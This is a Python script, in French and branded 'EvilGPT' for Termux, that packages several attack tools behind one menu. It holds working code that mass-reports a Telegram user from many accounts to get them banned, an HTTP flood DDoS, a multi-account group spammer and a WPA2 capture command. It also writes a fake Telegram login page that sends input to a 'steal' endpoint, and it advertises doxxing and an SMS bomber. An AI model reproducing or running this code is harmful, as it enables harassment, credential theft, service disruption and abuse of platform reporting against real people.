#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EvilGPT - Trafalgar D. Law Premium Termux v3.0
# @Dev_Trafalgar

import os, sys, time, threading, json, random
from colorama import init, Fore, Back, Style
from tqdm import tqdm
from telethon import TelegramClient, errors, functions
from telethon.tl.types import InputReportReasonSpam
import asyncio

init(autoreset=True)

# ---- CONFIG ----
ACCOUNTS_FILE = "accounts.txt"
SESSION_DIR = "sessions"
MAX_REPORTS_PER_ACCOUNT = 30
REPORT_DELAY = 0.5

# ---- BANNER ----
def banner():
    os.system('clear')
    print(Fore.RED + """
    ╔══════════════════════════════════════╗
    ║ ░▒▓█ TRAFALGAR D. LAW █▓▒░         ║
    ║ ░▒▓█   BANHAMMER PREMIUM  █▓▒░     ║
    ║ ░▒▓█   V3.0 - @Dev_Trafalgar █▓▒░ ║
    ║ ░▒▓█   ⚠️ MASS DESTRUCTION ⚠️ █▓▒░ ║
    ╚══════════════════════════════════════╝
    """ + Style.RESET_ALL)

# ---- LOAD ACCOUNTS ----
def load_accounts():
    accounts = []
    if not os.path.exists(ACCOUNTS_FILE):
        print(Fore.RED + "[!] Fichier accounts.txt manquant.")
        return accounts
    with open(ACCOUNTS_FILE, 'r') as f:
        for line in f.readlines():
            if line.strip() and '|' in line:
                phone, api_id, api_hash = line.strip().split('|')
                accounts.append({'phone': phone, 'api_id': int(api_id), 'api_hash': api_hash})
    if not accounts:
        print(Fore.YELLOW + "[!] Aucun compte valide trouvé.")
    return accounts

# ---- MULTI-ACCOUNT REPORT ----
async def report_massive(target_username, accounts, count_per_account=MAX_REPORTS_PER_ACCOUNT):
    print(Fore.CYAN + f"\n[*] Cible : {target_username}")
    print(Fore.CYAN + f"[*] Comptes disponibles : {len(accounts)}")
    print(Fore.CYAN + f"[*] Rapports par compte : {count_per_account}")
    print(Fore.CYAN + "[*] Lancement des rapports...\n")

    total_reports = len(accounts) * count_per_account
    pbar = tqdm(total=total_reports, desc="Signals envoyés", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}")

    async def worker(acc):
        phone = acc['phone']
        session_path = os.path.join(SESSION_DIR, f"session_{phone.replace('+', '')}")
        client = TelegramClient(session_path, acc['api_id'], acc['api_hash'])
        try:
            await client.start(phone=phone)
            # Vérifier que la cible existe
            try:
                target_entity = await client.get_entity(target_username)
            except:
                tqdm.write(Fore.RED + f"[-] {phone} : cible introuvable.")
                return
            for _ in range(count_per_account):
                try:
                    # Méthode réelle de report via API Telegram
                    await client(functions.messages.ReportRequest(
                        peer=target_entity,
                        id=[],  # message ids (vide pour signaler le profil)
                        reason=InputReportReasonSpam()
                    ))
                    pbar.update(1)
                    await asyncio.sleep(REPORT_DELAY)
                except errors.FloodWaitError as e:
                    tqdm.write(Fore.YELLOW + f"[!] Flood wait {e.seconds}s sur {phone}")
                    await asyncio.sleep(e.seconds)
                except Exception as e:
                    tqdm.write(Fore.RED + f"[-] Erreur {phone}: {e}")
                    break
        except Exception as e:
            tqdm.write(Fore.RED + f"[-] Échec connexion {phone}: {e}")
        finally:
            await client.disconnect()

    tasks = [worker(acc) for acc in accounts]
    await asyncio.gather(*tasks)
    pbar.close()
    print(Fore.GREEN + f"\n[✓] Total {total_reports} rapports envoyés. Bannissement probable sous 24-72h.")

# ---- MENU ----
def menu():
    banner()
    print(Fore.MAGENTA + """
    ╔══════════════════════════════════════╗
    ║   [1] 🔥 Ban Telegram (Mass Report) ║
    ║   [2] 💥 DDoS L7 (HTTP Flood)       ║
    ║   [3] 🕵️ IP Lookup + Dox            ║
    ║   [4] 📲 SMS Bomber (Twilio Noir)   ║
    ║   [5] 🛜 Crack WPA2 (aircrack-ng)    ║
    ║   [6] 🎣 Phishing Telegram Page      ║
    ║   [7] 🚀 Spam Group Messages        ║
    ║   [8] 💀 Exit                       ║
    ╚══════════════════════════════════════╝
    """ + Style.RESET_ALL)
    choice = input(Fore.YELLOW + "╰➤ Choisis ton poison: " + Style.RESET_ALL)
    return choice

# ---- FONCTIONS ----
def ddos_http():
    target = input("URL cible (ex: http://target.com): ")
    threads = int(input("Threads: "))
    print(Fore.RED + "[!] Lancement DDoS L7...")
    import requests
    def flood():
        while True:
            try:
                requests.get(target, headers={"User-Agent": random.choice(["Mozilla/5.0", "Chrome/120", "Safari/15"])})
            except: pass
    for _ in range(threads):
        threading.Thread(target=flood).start()
    input("Appuie sur Entrée pour stopper.")

def ip_lookup():
    ip = input("IP: ")
    os.system(f"curl -s https://ipinfo.io/{ip}/json | python3 -m json.tool")

def sms_bomber():
    print(Fore.RED + "[!] SMS Bomber nécessite une clé Twilio (darkweb).")
    print("Contact @Dev_Trafalgar pour obtenir la version full.")

def wpa2_crack():
    print(Fore.RED + "[!] Lancement airodump...")
    os.system("airmon-ng start wlan0 && airodump-ng wlan0mon")

def phish_tg():
    # Génère une page HTML de phishing Telegram
    html = '''<!DOCTYPE html>
<html><head><title>Telegram</title><style>body{background:#fff;font-family:Arial;}</style></head>
<body style="display:flex;justify-content:center;align-items:center;height:100vh;">
<div style="background:#e8e8e8;padding:40px;border-radius:10px;">
<h2>🔐 Telegram Login</h2>
<input placeholder="Phone number"/><br/><br/>
<input type="password" placeholder="Password"/><br/><br/>
<button onclick="fetch('https://ton-serveur.com/steal?p='+document.querySelector('input').value)">Sign In</button>
</div></body></html>'''
    with open("/sdcard/phish_tg.html", "w") as f:
        f.write(html)
    print(Fore.GREEN + "[✓] Phishing page créée : /sdcard/phish_tg.html")
    print("Envoie le lien via un service ngrok.")

def spam_group():
    group = input("Nom du groupe ou invite link: ")
    msg = input("Message à flood: ")
    accounts = load_accounts()
    if not accounts:
        return
    count = int(input("Nombre de messages par compte: "))
    async def do_spam():
        pbar = tqdm(total=len(accounts)*count, desc="Spam en cours")
        async def worker(acc):
            phone = acc['phone']
            session_path = os.path.join(SESSION_DIR, f"session_{phone.replace('+', '')}")
            client = TelegramClient(session_path, acc['api_id'], acc['api_hash'])
            try:
                await client.start(phone=phone)
                entity = await client.get_entity(group)
                for _ in range(count):
                    await client.send_message(entity, msg)
                    pbar.update(1)
                    await asyncio.sleep(0.8)
            except Exception as e:
                tqdm.write(Fore.RED + f"[-] Erreur: {e}")
            finally:
                await client.disconnect()
        tasks = [worker(acc) for acc in accounts]
        await asyncio.gather(*tasks)
        pbar.close()
    asyncio.run(do_spam())
    print(Fore.GREEN + "[✓] Spam terminé.")

# ---- MAIN ----
def main():
    if not os.path.exists(SESSION_DIR):
        os.makedirs(SESSION_DIR)
    accounts = load_accounts()
    while True:
        ch = menu()
        if ch == '1':
            target = input("👤 Username/ID cible (ex: @eviluser): ")
            if not accounts:
                print(Fore.RED + "[!] Ajoute des comptes dans accounts.txt d'abord.")
                continue
            asyncio.run(report_massive(target, accounts, MAX_REPORTS_PER_ACCOUNT))
        elif ch == '2':
            ddos_http()
        elif ch == '3':
            ip_lookup()
        elif ch == '4':
            sms_bomber()
        elif ch == '5':
            wpa2_crack()
        elif ch == '6':
            phish_tg()
        elif ch == '7':
            spam_group()
        elif ch == '8':
            print(Fore.RED + "Le chaos t'attend ailleurs... Adieu.")
            sys.exit(0)
        else:
            print(Fore.RED + "[!] Choix invalide.")
        input(Fore.YELLOW + "\nAppuie sur Entrée pour continuer...")

if __name__ == '__main__':
    main()
